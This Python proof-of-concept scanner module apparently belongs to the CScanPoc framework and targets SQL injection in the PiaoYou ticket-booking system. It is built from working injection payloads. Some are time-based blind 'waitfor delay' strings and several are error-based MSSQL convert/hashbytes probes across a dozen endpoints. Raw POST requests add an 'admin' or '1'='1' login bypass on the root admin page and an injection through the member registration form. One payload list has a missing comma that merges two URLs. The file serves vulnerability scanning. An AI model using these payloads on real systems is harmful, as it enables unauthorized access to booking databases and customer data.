# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import time
import urllib

class Vuln(ABVuln):
    vuln_id = 'PiaoYou_0003' # 平台漏洞编号，留空
    name = 'PiaoYou 订票系统注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-03-17'  # 漏洞公布时间
    desc = '''
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '票友订票系统'  # 漏洞应用名称
    product_version = '*'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '2cd40748-366e-47b0-a6c8-1eb3f95a5494'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            #No.1 http://www.wooyun.org/bugs/wooyun-2010-0101951
            time_blind = "%27;%20waitfor%20delay%20%270:0:5%27%20--%20"
            payloads = [
                "/Json_db/other_report.aspx?its=1&stype=%s&dfs=0&sdate=2015-3-17&edate=2015-3-17&fs=&keyword=1&col=id,subject,name,kefu,sales,hc,hb,qforder,total,ysmoney,stype,sdate,content&_search=false&nd=1426583717093&rows=25&page=1&sidx=id&sord=desc",
                "/Json_db/flight_search.aspx?stype=%s&ptype=&ddw=1&sdate=2015-3-17&edate=2015-3-17&fs=&keyword=&_search=false&nd=1426585534292&rows=18&page=1&sidx=id&sord=desc"
            ]
            for payload in payloads:
                target = self.target + payload % ''
                target2 = self.target + payload % time_blind
                s = time.time()
                code, head, body, errcode, final_url = hh.http(target)
                t1 = time.time() - s
                s = time.time()
                code, head, body, errcode, final_url = hh.http(target2)
                t2 = time.time() - s
                if t2 - t1 > 4:
                    #security_hole(target2)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

            #No.2 http://www.wooyun.org/bugs/wooyun-2010-0101031
            #No.3 http://www.wooyun.org/bugs/wooyun-2010-0101090
            #No.4 http://www.wooyun.org/bugs/wooyun-2010-0101091
            #No.5 http://www.wooyun.org/bugs/wooyun-2010-0101092
            #No.6 http://www.wooyun.org/bugs/wooyun-2010-0101093
            #No.7 http://www.wooyun.org/bugs/wooyun-2010-0101102
            #No.8 http://www.wooyun.org/bugs/wooyun-2010-0101103
            #No.9 http://www.wooyun.org/bugs/wooyun-2010-0101104
            #No.10 http://www.wooyun.org/bugs/wooyun-2010-0101106
            payloads = [
                "/json_db/Recycle_orders.aspx?sd=2015-03-05&ed=2015-03-12&kf=1%27%20and/**/1=convert(int,(select/**/sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))))%20and/**/%271%27=%271&key=&_search=false&nd=1426147050052&rows=5000&page=1&sidx=mid&sord=desc",
                "/system/role_flag.aspx?id=65%20and/**/1=convert(int,(select/**/sys.fn_varbintohexstr(hashbytes('MD5','1'))))%20and/**/1=1&role=caiwu"
                "/json_db/other_report.aspx?its=3&jq=0&stype=&dfs=0&levels=1%27%20and/**/1=convert(int,(select/**/sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))))%20and/**/%271%27=%271",
                "/json_db/flight_return.aspx?sdate=2015-03-13&edate=2015-03-13&cp=1%27%20and/**/1=convert(int,(select/**/sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))))%20and/**/%271%27=%271",
                "/json_db/meb_list.aspx?type=1%27%20and/**/1=convert(int,(select/**/sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))))%20and/**/%271%27=%271",
                "/json_db/air_company.aspx?air=0&key=1%27%20and/**/1=convert(int,(select/**/sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))))%20and/**/%271%27=%271",
                "/json_db/order_gys.aspx?stype=0&key=1%27%20and/**/1=convert(int,(select/**/sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))))%20and/**/%271%27=%271",
                "/json_db/air_company.aspx?air=0&key=1%27%20and/**/1=convert(int,(select/**/sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))))%20and/**/%271%27=%271",
                "/Json_db/flight_report.aspx?dd=0&ee=2015-03-12&ff=2015-03-12&rr=1%27%20and/**/1=convert(int,(select/**/sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))))%20and/**/%271%27=%271",
                "/Json_db/flight_search.aspx?jq=0&kefu=admin&stype=&ptype=&ddw=1&sdate=2010-03-12&edate=2015-03-12&cp=1%27%20and/**/1=convert(int,(select/**/sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))))%20and/**/%271%27=%271",
                "/info/zclist_view.aspx?id=40%20and/**/1=convert(int,(select/**/sys.fn_varbintohexstr(hashbytes('MD5','1'))))%20and/**/1=1"
            ]
            for payload in payloads:
                target = self.target + payload
                code, head, body, errcode, final_url = hh.http(target)
                if 'c4ca4238a0b923820dcc509a6f75849' in body:
                    #security_hole(target)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

            #No.11 http://www.wooyun.org/bugs/wooyun-2010-0110489
            payload = "/PiaoYou_root.aspx"
            target = self.target + payload
            code, head, body, errcode, final_url = hh.http(target)
            view = re.findall("id=\"__VIEWSTATE\" value=\"([^<>]+)\"", body)
            event = re.findall("id=\"__EVENTVALIDATION\" value=\"([^>]+)\" />", body)
            if len(view) > 0 and len(event) > 0:
                raw = '''
POST xx HTTP/1.1
Host: xx
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://oa.ryxtrip.com/PiaoYou_root.aspx
Cookie: ASP.NET_SessionId=yvzt42mfa5gspzjrisnuxoxz
Connection: keep-alive
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 376

__VIEWSTATE=''' + urllib.quote(view[0])+ '''&__EVENTVALIDATION=''' + urllib.quote(event[0]) + '''&aname=admin%27+or+%271%27%3D%271&apwd=&str=select+sys.fn_varbintohexstr%28hashbytes%28%27MD5%27%2C%271%27%29%29&Button1=%E6%89%A7%E8%A1%8C
                '''
                code, head, body, errcode, final_url = hh.http(target, raw=raw)

                if 'c4ca4238a0b923820dcc509a6f75849' in body:
                    #security_hole(target)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))


            #No.12 http://www.wooyun.org/bugs/wooyun-2010-0101555
            payload = "/member/reg.aspx"
            target = self.target + payload
            code, head, body, errcode, final_url = hh.http(target)
            view = re.findall("id=\"__VIEWSTATE\" value=\"([^>]+)\"", body)
            event = re.findall("id=\"__EVENTVALIDATION\" value=\"([^>]+)\" />", body)
            if len(view) > 0 and len(event) > 0:
                raw = '''
POST xx HTTP/1.1
Host: xx
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://www.89937373.com/member/reg.aspx
Cookie: ASP.NET_SessionId=lehzsqepjxlufl55vopme4j5; CNZZDATA3807746=cnzz_eid%3D1463217541-1438622575-%26ntime%3D1438622575
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 817

__VIEWSTATE=''' + urllib.quote(view[0]) + '''&__EVENTVALIDATION=''' + urllib.quote(event[0]) + '''&uc1%24password=&uc1%24tb_confirm=&levelm=%E6%99%AE%E9%80%9A&card=73333%27%29%20and%2f%2a%2a%2f1%3dconvert%28int%2C%28select%2f%2a%2a%2fsys.fn_varbintohexstr%28hashbytes%28%27MD5%27%2C%271%27%29%29%29%29%20and%2f%2a%2a%2f%28%271%27%3d%271&name=1&pwd=32131&lxr=2&sex=%E7%94%B7&phone=3&mobile=9&fax=4&mail=0&qq=55&msn=1&address=6®ok=%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%86%8C
                '''
                code, head, body, errcode, final_url = hh.http(target, raw=raw)

                if 'c4ca4238a0b923820dcc509a6f75849' in body:
                    #security_hole(target)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
